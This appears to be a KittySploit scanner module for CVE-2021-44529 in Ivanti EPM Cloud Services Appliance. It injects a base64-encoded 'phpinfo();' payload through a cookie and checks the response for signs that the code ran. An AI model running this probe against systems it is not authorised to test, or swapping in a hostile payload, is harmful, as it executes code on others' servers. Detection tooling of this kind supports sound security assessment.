#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ivanti EPM Cloud Services Appliance (CSA) before version 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ivanti EPM Cloud Services Appliance Code Injection Detection',
        'description': 'Ivanti EPM Cloud Services Appliance (CSA) before version 4.6.0-512 is susceptible to a code injection vulnerability because it allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'ivanti', 'epm', 'csa', 'injection', 'packetstorm', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://forums.ivanti.com/s/article/SA-2021-12-02',
            'https://twitter.com/Dinosn/status/1505273954478530569',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-44529',
            'http://packetstormsecurity.com/files/166383/Ivanti-Endpoint-Manager-CSA-4.5-4.6-Remote-Code-Execution.html',
            'https://github.com/SYRTI/POC_to_review',
        ],
        'cve': 'CVE-2021-44529',
    }

    def run(self):
        path = '/client/index.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'ab=ab; c=cGhwaW5mbygpOw==; d=; e=;'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('phpinfo()', 'Cloud Services Appliance',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Ivanti EPM Cloud Services Appliance Code Injection detected', path=path)
            return True
        return False

